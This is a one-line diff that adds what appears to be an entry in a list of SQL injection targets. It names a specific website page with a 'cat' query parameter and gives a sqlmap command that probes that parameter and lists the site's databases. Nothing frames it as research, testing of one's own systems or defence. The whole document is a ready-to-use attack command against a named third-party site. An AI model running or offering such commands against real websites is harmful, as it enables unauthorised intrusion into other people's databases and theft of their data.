@@ -1,0 +1,1 @@
+http://www.origin-food.org/2005/base.php?cat=30 (GET)  # sqlmap.py -u http://www.origin-food.org/2005/base.php?cat=30 --dbs
